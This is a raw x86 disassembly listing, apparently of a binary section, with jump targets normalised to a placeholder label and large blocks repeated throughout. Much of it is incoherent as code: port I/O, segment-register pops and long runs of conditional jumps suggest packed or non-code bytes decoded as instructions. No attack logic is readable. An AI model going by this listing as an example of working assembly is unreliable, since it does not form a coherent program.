bound ebp [ esi - 0x3fd4cc9 ]
jmp r-xdata
jpo r-xdata
bound ebp [ esi + 0x1fae6213 ]
push ebx
jmp r-xdata
pop es
push 0xd8b8b307
sub edi [ ebp + 0x17ae62bc ]
mov ebp 0x17ae62bc
jpo r-xdata
adc edx [ esp + edx ]
pop di
adc al 0x9e
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
bound ebp [ esi + 0x13ae6217 ]
bound ebp [ esi - 0x1414ace1 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
in al 0x67
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jecxz r-xdata
fcomp [ 0x27022560 ]
jpo r-xdata
jpo r-xdata
and dx [ esi ]
bound ebp [ esi - 0x367e4cf7 ]
lea esp [ edx - 0x52 ]
btr [ ecx - 0x519d7235 ] eax
or eax 0x36e902b3
adc al 0x14
jpo r-xdata
pushad
pop es
add bh ah
push cs
adc al 0x14
jpo r-xdata
push ebx
jpo r-xdata
adc al 0x14
jpo r-xdata
mov esp 0x6602ef81
pop es
adc al 0x14
mov eax 0x1d476e66
adc al 0x14
mov ebx 0x66dbbd14
outsb
and edx [ esi ]
push ds
sub edi 0x14076602
adc al 0x7b
lea esp [ edx - 0x52 ]
aaa
mov bl 0x2
cld
jmp r-xdata
aaa
adc al 0x9e
pop es
mov esp 0x14377503
adc al 0x68
das
[ esi + 0x2b ]
sahf
stosd [ edi ]
jpo r-xdata
outsd
adc al 0x14
mov ebx 0x2c7bd14
cmp bh [ esp + edx ]
outsb
inc edi
sbb eax 0x14bb1414
mov ebp 0x236e66db
push ss
bound ebp [ esi - 0x7ed42705 ]
lds ecx [ ebp - 0x4c06519e ]
sbb [ ebp + 0x1fae628d ] 0x8fb02b3
adc al 0x14
adc al 0x14
jpo r-xdata
or [ eax - 0x25fdcea0 ] 0x7b14140c
bound esi [ esi + 0x628db013 ]
mov dh 0x11
adc al 0x14
outsb
inc edi
sbb eax 0x73031414
jmp r-xdata
push ss
mov [ 0x2fae2c9d ] eax
jpo r-xdata
0x7bebebe8 0x7b7b
sub [ ebx - 0x141715fe ] 0x7b7b7beb
jpo r-xdata
jpo r-xdata
add bl dl
or al 0x14
jpo r-xdata
sub al 0xae
popfd
jpo r-xdata
add ch dl
call 0x7bc2e53a
jpo r-xdata
jpo r-xdata
xchg ecx eax
push ss
adc al 0x14
mov ebx 0x2e3bd14
rcr [ 0x2d601414 ] 0x1
push ebx
0x6249e4eb 0xfa6
scasb [ edi ]
jpo r-xdata
sti
fsubr [ ebx ]
add ebp 0xf9ae628d
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
pop ds
mov bl 0x2
sti
or [ esp + edx ] dl
jmp r-xdata
push edx
stc
add ebp [ edi + 0x37 ]
adc al 0x14
add dh [ ebp + 0x2 ]
adc al 0x14
jpo r-xdata
sbb eax 0x2d601414
sub_46f6e2
push 0x4e02e72f
call 0xffffffffbec2e2d7
pushad
sub eax 0x143e0f02
adc al 0x7b
push 0x55
push edi
jmp r-xdata
jpo r-xdata
jpo r-xdata
add cl [ esi - 0x18 ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x2ec5de4
cmpsd [ esi ] [ edi ]
xor [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
adc al 0x83
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jecxz r-xdata
jpo r-xdata
out dx eax
add ah [ esi + 0x7 ]
outsb
jpo r-xdata
adc al 0x14
jpo r-xdata
cmp dh [ edx ]
jpo r-xdata
jpo r-xdata
outsd
jpo r-xdata
add ecx [ edx + 0x23 ]
adc al 0x14
mov dl 0x68
adc ebp edx
in al 0x6f
adc al 0x14
bound ebp [ esi - 0x3fd4cc9 ]
and edx [ esi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add [ esi ] 0x10
jmp r-xdata
jpo r-xdata
fsubr [ ebx ]
jpo r-xdata
adc al 0x14
jpo r-xdata
add bh [ edx ]
jpo r-xdata
jpo r-xdata
adc al 0x7b
add eax [ edi ]
cld
jmp r-xdata
jpo r-xdata
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
jpo r-xdata
bound ebp [ esi + 0x1fae6213 ]
push ebx
jmp r-xdata
pop es
push 0xd8b8b307
sub edi [ ebp + 0x17ae62bc ]
mov ebp 0x17ae62bc
jpo r-xdata
add edi [ esi - 0x4414140e ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
cmp al 0x14
jpo r-xdata
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
sbb eax 0xf5022360
add [ esp + edx ] dl
pushfd
jpo r-xdata
mov al 0x2
pop esi
0x557bebeb 0xe9c7
jpo r-xdata
jpo r-xdata
adc al 0x7b
adc al 0x14
mov eax 0x1d476e66
adc al 0x14
mov ebx 0x66dbbd14
outsb
and edx [ esi ]
push ds
sub edi 0x14076602
adc al 0x7b
lea esp [ edx - 0x52 ]
aaa
mov bl 0x2
cld
jpo r-xdata
bound ebp [ esi + 0x13ae6217 ]
bound ebp [ esi - 0x1414ace1 ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
das
mov dl 0x6e
adc al 0x7b
jpo r-xdata
adc al 0xae
and ebx [ ecx + 0x2ca6bd8e ]
scasb [ edi ]
daa
pushfd
mov bl [ ecx + 0x5fae2c8e ]
mov bl 0x8e
test [ ebp - 0x59ac51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
push edi
test [ ebp + 0x4502a6a6 ] edi
and eax 0x7b7b1414
jpo r-xdata
sub al 0xae
jpo r-xdata
jpo r-xdata
jpo r-xdata
pop esp
sbb eax 0x3e0e6fe4
adc al 0x14
mov [ ebp - 0x43 ] bh
add bl [ edi ]
loop r-xdata
outsb
jpo r-xdata
and dx [ esi ]
bound ebp [ esi - 0x367e4cf7 ]
lea esp [ edx - 0x52 ]
btr [ ecx - 0x519d7235 ] eax
or eax 0x36e902b3
adc al 0x14
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebp 0x2c8a9ca6
jpo r-xdata
call 0xffffffffafa7b30e
iretd
fcom [ eax + edi * 4 ]
lodsb [ esi ]
adc al 0x7d
inc edi
jmp r-xdata
jpo r-xdata
push 0x3bde72f
adc al 0x14
jpo r-xdata
jmp r-xdata
pop ss
push 0xe4e81796
imul edi [ eax ] 0x63141414
scasb [ edi ]
pop ebx
arpl [ esi + 0xbae631b ] bp
arpl [ esi + 0x2bae633b ] bp
cmpsb [ esi ] [ edi ]
sub ebx eax
cmp [ edx - 0x52 ] esp
pop ss
pushad
cmpsb [ esi ] [ edi ]
pop ss
mov ch [ esi + ebp * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
add bl [ esi - 0x16 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
stosd [ edi ]
jpo r-xdata
outsd
adc al 0x14
mov ebx 0x2c7bd14
cmp bh [ esp + edx ]
outsb
inc edi
sbb eax 0x14bb1414
mov ebp 0x236e66db
push ss
bound ebp [ esi - 0x7ed42705 ]
lds ecx [ ebp - 0x4c06519e ]
sbb [ ebp + 0x1fae628d ] 0x8fb02b3
adc al 0x14
outsb
in al 0x6f
jpo r-xdata
fcomp [ 0x27022560 ]
pop di
jpo r-xdata
jpo r-xdata
out 0xbd eax
jpo r-xdata
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

scasb [ edi ]
or esp [ ebx - 0x52 ]
cmp esp [ ebx - 0x52 ]
sub esp [ esi - 0x5a ]
scasb [ edi ]
pushad
xchg edi eax
psubusb xmm3 [ 0x34602560 ]
cmp [ eax ] dl
push 0x63a9e32d
mov bh 0xfe
dec eax
push 0x69e4cb15
add dl [ esp + edx ]
adc al 0x14
scasb [ edi ]
fsubr [ ebx ]
fdivr [ ecx ]
bound ebp [ esi + 0x17a66017 ]
cli
add ch dh
push ds
in al 0x5c
das
jpo r-xdata
mov [ 0x2fae2c9d ] eax
jpo r-xdata
0x7bebebe8 0x7b7b
sub [ ebx - 0x141715fe ] 0x7b7b7beb
jpo r-xdata
jpo r-xdata
jpo r-xdata
jecxz r-xdata
add ah [ 0x7b141401 ]
pushad
cmpsb [ esi ] [ edi ]
pop ss
pushad
xchg edi eax
add bx ax
sbb eax 0x27022560
jmp r-xdata
jmp r-xdata
sahf
push ss
jpo r-xdata
add esp [ ebp + 0x26 ]
adc al 0x14
jpo r-xdata
cmpsb [ esi ] [ edi ]
sub al 0xae
popfd
jpo r-xdata
add ch dl
call 0x7bc2e53a
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebp 0x3c3a02c7
adc al 0x14
jpo r-xdata
adc al 0x14
outsb
inc edi
sbb eax 0x73031414
jmp r-xdata
push ss
adc al 0x3
jpo r-xdata
adc al 0x14
jpo r-xdata
scasb [ edi ]
jpo r-xdata
sti
fsubr [ ebx ]
add ebp 0xf9ae628d
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
pop ds
mov bl 0x2
sti
or [ esp + edx ] dl
adc al 0x14
jpo r-xdata
mov esp 0x6602ef81
pop es
adc al 0x14
jpo r-xdata
mov esi 0xbbebebf2
jpo r-xdata
sub esp esp
outsb
xchg esp eax
adc al 0xb2
outsb
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
bound edx [ esi - 0x72ea9fe1 ]
bound edx [ esi - 0x72ec9fe3 ]
bound edx [ esi + 0x2bd8113 ]
out dx eax
xor edx [ esp + edx ]
jpo r-xdata
pushad
pop es
add bl [ esi ]
mov ebx 0x135f6666
jpo r-xdata
pop ds
0x67e4ebeb 0x3f53
jpo r-xdata
adc edx [ esp + edx ]
pop di
aaa
adc al 0x9e
pop es
mov esp 0x14377503
adc al 0x68
das
[ esi + 0x2b ]
adc al 0x9e
jmp r-xdata
jpo r-xdata
jpo r-xdata
in al 0x67
jpo r-xdata
pushad
pop es
add bh ah
push cs
adc al 0x14
jpo r-xdata
jpo r-xdata
push ebx
aas
adc al 0x14
add al [ eax + 0x3f ]
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
bound esi [ esi + 0x628db013 ]
mov dh 0x11
or [ eax - 0x25fdcea0 ] 0x7b14140c
jpo r-xdata
add bl dl
or al 0x14
jpo r-xdata
jpo r-xdata
scasb [ edi ]
pop ds
mov ebx 0x1400d202
xchg ecx eax
push ss
adc al 0x14
mov ebx 0x2e3bd14
rcr [ 0x2d601414 ] 0x1
push ebx
0x6249e4eb 0xfa6
jmp r-xdata
push edx
stc
add ebp [ edi + 0x37 ]
adc al 0x14
add dh [ ebp + 0x2 ]
adc al 0x14
jpo r-xdata
sbb eax 0x2d601414
sub_46f732
outsb
dec ebx
push ss
adc al 0x14
mov ebx 0x22a002b8
adc al 0x14
jpo r-xdata
pushad
sub eax 0x14012502
adc al 0x7b
jpo r-xdata
pushad
cmpsb [ esi ] [ edi ]
pop ss
pushad
xchg edi eax
add bx ax
sbb eax 0x27022560
jecxz r-xdata
add ah [ 0x7b141401 ]
jmp r-xdata
jpo r-xdata
mov ebp 0x3c3a02c7
adc al 0x14
jpo r-xdata
out 0xbd eax
add esp [ ebp + 0x26 ]
adc al 0x14
mov dl 0x6e
sub esp esp
outsb
xchg esp eax
and ch [ esi + 0x2b ]
in al 0x72
sub ah [ eax + 0x2a ]
add bl [ ecx + 0x4 ]
adc al 0x14
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x14
jpo r-xdata
cmp dh [ edx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
add bh [ edx ]
jpo r-xdata
jpo r-xdata
adc al 0xae
and ebx [ ecx + 0x2ca6bd8e ]
scasb [ edi ]
daa
pushfd
mov bl [ ecx + 0x5fae2c8e ]
mov bl 0x8e
test [ ebp - 0x59ac51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
push edi
test [ ebp + 0x4502a6a6 ] edi
and eax 0x7b7b1414
jpo r-xdata
cmpsb [ esi ] [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
cmp al 0x14
jpo r-xdata
jpo r-xdata
mov ch [ esi + ebp * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
add bl [ esi - 0x16 ]
jmp r-xdata
pop esp
sbb eax 0x3e0e6fe4
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
scasb [ edi ]
pop ss
push 0xe4e81796
imul edi [ eax ] 0x63141414
scasb [ edi ]
pop ebx
arpl [ esi + 0xbae631b ] bp
arpl [ esi + 0x2bae633b ] bp
cmpsb [ esi ] [ edi ]
fsubr [ ebx ]
fdivr [ ecx ]
bound ebp [ esi + 0x17a66017 ]
fsubr [ ebx ]
jpo r-xdata
cli
add ch dh
push ds
in al 0x5c
jmp r-xdata
mov ebp 0x2c8a9ca6
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
call 0xffffffffafa7b30e
iretd
fcom [ eax + edi * 4 ]
lodsb [ esi ]
adc al 0x7d
inc edi
jmp r-xdata
bound ebp [ esi + 0x1fae6213 ]
push ebx
jmp r-xdata
pop es
push 0xd8b8b307
sub edi [ ebp + 0x17ae62bc ]
mov ebp 0x17ae62bc
jpo r-xdata
adc al 0x83
jecxz r-xdata
pushfd
jpo r-xdata
mov al 0x2
pop esi
0x557bebeb 0xe9c7
outsb
bound ebp [ esi + 0x13ae6217 ]
bound ebp [ esi - 0x1414ace1 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
sub al 0xae
jpo r-xdata
jpo r-xdata
and dx [ esi ]
adc al 0x14
outsb
inc edi
sbb eax 0x73031414
jmp r-xdata
bound ebp [ esi - 0x367e4cf7 ]
lea esp [ edx - 0x52 ]
btr [ ecx - 0x519d7235 ] eax
or eax 0x36e902b3
adc al 0x14
jpo r-xdata
outsd
outsb
jmp r-xdata
jmp r-xdata
pushad
xchg edi eax
psubusb xmm3 [ 0x34602560 ]
cmp [ eax ] dl
push 0x63a9e32d
mov bh 0xfe
dec eax
push 0x69e4cb15
add dl [ esp + edx ]
adc al 0x14
scasb [ edi ]
sub ebx eax
cmp [ edx - 0x52 ] esp
pop ss
pushad
cmpsb [ esi ] [ edi ]
pop ss
stosd [ edi ]
jpo r-xdata
outsd
outsb
inc edi
sbb eax 0x14bb1414
mov ebp 0x236e66db
push ss
adc al 0x14
mov ebx 0x2c7bd14
cmp bh [ esp + edx ]
bound ebp [ esi - 0x7ed42705 ]
lds ecx [ ebp - 0x4c06519e ]
sbb [ ebp + 0x1fae628d ] 0x8fb02b3
adc al 0x14
add [ esi ] 0x10
mov [ ebp - 0x43 ] bh
add bl [ edi ]
loop r-xdata
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

scasb [ edi ]
or esp [ ebx - 0x52 ]
cmp esp [ ebx - 0x52 ]
sub esp [ esi - 0x5a ]
mov [ 0x2fae2c9d ] eax
jpo r-xdata
0x7bebebe8 0x7b7b
sub [ ebx - 0x141715fe ] 0x7b7b7beb
jpo r-xdata
jpo r-xdata
sub al 0xae
popfd
jpo r-xdata
add ch dl
call 0x7bc2e53a
jpo r-xdata
jpo r-xdata
scasb [ edi ]
jpo r-xdata
sti
fsubr [ ebx ]
add ebp 0xf9ae628d
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
pop ds
mov bl 0x2
sti
or [ esp + edx ] dl
sub_46f7ae
bound ebp [ esi - 0x519965 ]
lea esp [ edx - 0x62 ]
and [ eax - 0x62 ] 0xffffff97
mov ebx 0x25022d60
add [ esp + edx ] edx
jpo r-xdata
and dx [ esi ]
adc al 0x14
outsb
inc edi
sbb eax 0x73031414
jmp r-xdata
cmpsb [ esi ] [ edi ]
pop ss
pushad
xchg edi eax
add bx ax
sbb eax 0x27022560
jecxz r-xdata
outsd
add ah [ 0x7b141401 ]
pushad
jmp r-xdata
mov ebp 0x3c3a02c7
adc al 0x14
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0xae
and ebx [ ecx + 0x2ca6bd8e ]
scasb [ edi ]
daa
pushfd
mov bl [ ecx + 0x5fae2c8e ]
mov bl 0x8e
test [ ebp - 0x59ac51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
push edi
test [ ebp + 0x4502a6a6 ] edi
and eax 0x7b7b1414
jpo r-xdata
cmpsb [ esi ] [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ch [ esi + ebp * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
add bl [ esi - 0x16 ]
jmp r-xdata
pop esp
sbb eax 0x3e0e6fe4
adc al 0x14
scasb [ edi ]
pop ss
push 0xe4e81796
imul edi [ eax ] 0x63141414
scasb [ edi ]
pop ebx
arpl [ esi + 0xbae631b ] bp
arpl [ esi + 0x2bae633b ] bp
cmpsb [ esi ] [ edi ]
fsubr [ ebx ]
fdivr [ ecx ]
bound ebp [ esi + 0x17a66017 ]
fsubr [ ebx ]
jpo r-xdata
cli
add ch dh
push ds
in al 0x5c
jmp r-xdata
bound ebp [ esi + 0x1fae6213 ]
push ebx
jmp r-xdata
pop es
push 0xd8b8b307
sub edi [ ebp + 0x17ae62bc ]
mov ebp 0x17ae62bc
jpo r-xdata
adc al 0x83
jecxz r-xdata
bound ebp [ esi + 0x13ae6217 ]
bound ebp [ esi - 0x1414ace1 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound ebp [ esi - 0x367e4cf7 ]
lea esp [ edx - 0x52 ]
btr [ ecx - 0x519d7235 ] eax
or eax 0x36e902b3
adc al 0x14
jpo r-xdata
jpo r-xdata
outsd
outsb
jmp r-xdata
stosd [ edi ]
jpo r-xdata
outsb
inc edi
sbb eax 0x14bb1414
mov ebp 0x236e66db
push ss
adc al 0x14
mov ebx 0x2c7bd14
cmp bh [ esp + edx ]
adc al 0x7b
jpo r-xdata
bound ebp [ esi - 0x7ed42705 ]
lds ecx [ ebp - 0x4c06519e ]
sbb [ ebp + 0x1fae628d ] 0x8fb02b3
adc al 0x14
jpo r-xdata
jpo r-xdata
add [ esi ] 0x10
mov [ ebp - 0x43 ] bh
add bl [ edi ]
loop r-xdata
mov ebp 0x2c8a9ca6
mov [ 0x2fae2c9d ] eax
jpo r-xdata
0x7bebebe8 0x7b7b
adc al 0x7b
jpo r-xdata
sub [ ebx - 0x141715fe ] 0x7b7b7beb
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsb
sub al 0xae
jpo r-xdata
jpo r-xdata
popfd
jpo r-xdata
add ch dl
call 0x7bc2e53a
jpo r-xdata
jpo r-xdata
pushfd
jpo r-xdata
mov al 0x2
pop esi
0x557bebeb 0xe9c7
scasb [ edi ]
jpo r-xdata
sti
fsubr [ ebx ]
add ebp 0xf9ae628d
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
pop ds
mov bl 0x2
sti
or [ esp + edx ] dl
sub al 0xae
jpo r-xdata
jmp r-xdata
pushad
xchg edi eax
psubusb xmm3 [ 0x34602560 ]
cmp [ eax ] dl
push 0x63a9e32d
mov bh 0xfe
dec eax
push 0x69e4cb15
add dl [ esp + edx ]
adc al 0x14
scasb [ edi ]
sub ebx eax
cmp [ edx - 0x52 ] esp
pop ss
pushad
cmpsb [ esi ] [ edi ]
pop ss
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

scasb [ edi ]
or esp [ ebx - 0x52 ]
cmp esp [ ebx - 0x52 ]
sub esp [ esi - 0x5a ]
sub_46f7f0
add ah al
add dl [ esp + edx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0x83
jpo r-xdata
jpo r-xdata
jpo r-xdata
jecxz r-xdata
jpo r-xdata
jpo r-xdata
outsd
outsb
jpo r-xdata
jpo r-xdata
jpo r-xdata
add [ esi ] 0x10
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
jpo r-xdata
pushfd
jpo r-xdata
mov al 0x2
pop esi
0x557bebeb 0xe9c7
jpo r-xdata
jpo r-xdata
adc al 0x14
mov eax 0x1d476e66
adc al 0x14
mov ebx 0x66dbbd14
outsb
and edx [ esi ]
sub edi 0x14076602
adc al 0x7b
lea esp [ edx - 0x52 ]
aaa
mov bl 0x2
cld
push ds
jpo r-xdata
adc al 0xae
and ebx [ ecx + 0x2ca6bd8e ]
scasb [ edi ]
daa
pushfd
mov bl [ ecx + 0x5fae2c8e ]
mov bl 0x8e
test [ ebp - 0x59ac51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
push edi
test [ ebp + 0x4502a6a6 ] edi
and eax 0x7b7b1414
jpo r-xdata
sub al 0xae
jpo r-xdata
jpo r-xdata
jpo r-xdata
pop esp
sbb eax 0x3e0e6fe4
adc al 0x14
adc al 0x7b
jpo r-xdata
fsubr [ ebx ]
jpo r-xdata
mov [ ebp - 0x43 ] bh
add bl [ edi ]
loop r-xdata
outsb
and edx [ esi ]
adc al 0x14
add edi [ esi - 0x4414140e ]
pop di
adc edx [ esp + edx ]
add ecx [ edx + 0x23 ]
adc al 0x14
mov dl 0x68
adc ebp edx
in al 0x6f
jmp r-xdata
pop ss
push 0xe4e81796
imul edi [ eax ] 0x63141414
scasb [ edi ]
pop ebx
arpl [ esi + 0xbae631b ] bp
arpl [ esi + 0x2bae633b ] bp
cmpsb [ esi ] [ edi ]
sub ebx eax
cmp [ edx - 0x52 ] esp
pop ss
pushad
cmpsb [ esi ] [ edi ]
pop ss
mov ch [ esi + ebp * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
add bl [ esi - 0x16 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound ebp [ esi + 0x1fae6213 ]
push ebx
jmp r-xdata
pop es
push 0xd8b8b307
sub edi [ ebp + 0x17ae62bc ]
mov ebp 0x17ae62bc
jpo r-xdata
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

scasb [ edi ]
or esp [ ebx - 0x52 ]
cmp esp [ ebx - 0x52 ]
sub esp [ esi - 0x5a ]
scasb [ edi ]
pushad
xchg edi eax
psubusb xmm3 [ 0x34602560 ]
cmp [ eax ] dl
push 0x63a9e32d
mov bh 0xfe
dec eax
push 0x69e4cb15
add dl [ esp + edx ]
adc al 0x14
scasb [ edi ]
fsubr [ ebx ]
fdivr [ ecx ]
bound ebp [ esi + 0x17a66017 ]
cli
add ch dh
push ds
adc al 0x14
jpo r-xdata
in al 0x5c
das
jpo r-xdata
mov ebp 0x2c8a9ca6
bound ebp [ esi + 0x13ae6217 ]
bound ebp [ esi - 0x1414ace1 ]
jmp r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
jpo r-xdata
and dx [ esi ]
adc al 0x14
outsb
inc edi
sbb eax 0x73031414
jmp r-xdata
bound ebp [ esi - 0x367e4cf7 ]
lea esp [ edx - 0x52 ]
btr [ ecx - 0x519d7235 ] eax
or eax 0x36e902b3
adc al 0x14
jpo r-xdata
stosd [ edi ]
jpo r-xdata
outsd
adc al 0x14
mov ebx 0x2c7bd14
cmp bh [ esp + edx ]
adc al 0x7b
jpo r-xdata
outsb
inc edi
sbb eax 0x14bb1414
mov ebp 0x236e66db
push ss
bound ebp [ esi - 0x7ed42705 ]
lds ecx [ ebp - 0x4c06519e ]
sbb [ ebp + 0x1fae628d ] 0x8fb02b3
adc al 0x14
mov [ 0x2fae2c9d ] eax
jpo r-xdata
0x7bebebe8 0x7b7b
sub [ ebx - 0x141715fe ] 0x7b7b7beb
jpo r-xdata
jpo r-xdata
sub al 0xae
popfd
jpo r-xdata
add ch dl
call 0x7bc2e53a
jpo r-xdata
jpo r-xdata
scasb [ edi ]
jpo r-xdata
sti
fsubr [ ebx ]
add ebp 0xf9ae628d
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
pop ds
mov bl 0x2
sti
or [ esp + edx ] dl
sub_46f837
and eax [ ebx ]
or al 0x2e
adc al 0x14
mov eax 0x1d476e66
adc al 0x14
mov ebx 0x66dbbd14
outsb
and edx [ esi ]
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebp 0x2c8a9ca6
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0xae
and ebx [ ecx + 0x2ca6bd8e ]
scasb [ edi ]
daa
pushfd
mov bl [ ecx + 0x5fae2c8e ]
mov bl 0x8e
test [ ebp - 0x59ac51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
push edi
test [ ebp + 0x4502a6a6 ] edi
and eax 0x7b7b1414
jpo r-xdata
pushfd
jpo r-xdata
mov al 0x2
pop esi
0x557bebeb 0xe9c7
outsb
sub al 0xae
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
pop ss
push 0xe4e81796
imul edi [ eax ] 0x63141414
scasb [ edi ]
pop ebx
arpl [ esi + 0xbae631b ] bp
arpl [ esi + 0x2bae633b ] bp
cmpsb [ esi ] [ edi ]
sub ebx eax
cmp [ edx - 0x52 ] esp
pop ss
pushad
cmpsb [ esi ] [ edi ]
pop ss
jpo r-xdata
jpo r-xdata
adc al 0x83
jecxz r-xdata
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

scasb [ edi ]
or esp [ ebx - 0x52 ]
cmp esp [ ebx - 0x52 ]
sub esp [ esi - 0x5a ]
jpo r-xdata
jpo r-xdata
pop esp
sbb eax 0x3e0e6fe4
adc al 0x14
jpo r-xdata
mov ch [ esi + ebp * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
add bl [ esi - 0x16 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
outsd
outsb
jmp r-xdata
scasb [ edi ]
pushad
xchg edi eax
psubusb xmm3 [ 0x34602560 ]
cmp [ eax ] dl
push 0x63a9e32d
mov bh 0xfe
dec eax
push 0x69e4cb15
add dl [ esp + edx ]
adc al 0x14
scasb [ edi ]
fsubr [ ebx ]
fdivr [ ecx ]
bound ebp [ esi + 0x17a66017 ]
fsubr [ ebx ]
jpo r-xdata
cli
add ch dh
push ds
adc al 0x14
jpo r-xdata
in al 0x5c
das
jpo r-xdata
add [ esi ] 0x10
mov [ ebp - 0x43 ] bh
add bl [ edi ]
loop r-xdata
bound ebp [ esi + 0x1fae6213 ]
push ebx
jmp r-xdata
pop es
push 0xd8b8b307
sub edi [ ebp + 0x17ae62bc ]
mov ebp 0x17ae62bc
jpo r-xdata
cmpsb [ esi ] [ edi ]
bound ebp [ esi + 0x13ae6217 ]
bound ebp [ esi - 0x1414ace1 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
and dx [ esi ]
adc al 0x14
outsb
inc edi
sbb eax 0x73031414
jmp r-xdata
bound ebp [ esi - 0x367e4cf7 ]
lea esp [ edx - 0x52 ]
btr [ ecx - 0x519d7235 ] eax
or eax 0x36e902b3
adc al 0x14
jpo r-xdata
stosd [ edi ]
jpo r-xdata
outsd
adc al 0x14
mov ebx 0x2c7bd14
cmp bh [ esp + edx ]
adc al 0x7b
jpo r-xdata
outsb
inc edi
sbb eax 0x14bb1414
mov ebp 0x236e66db
push ss
bound ebp [ esi - 0x7ed42705 ]
lds ecx [ ebp - 0x4c06519e ]
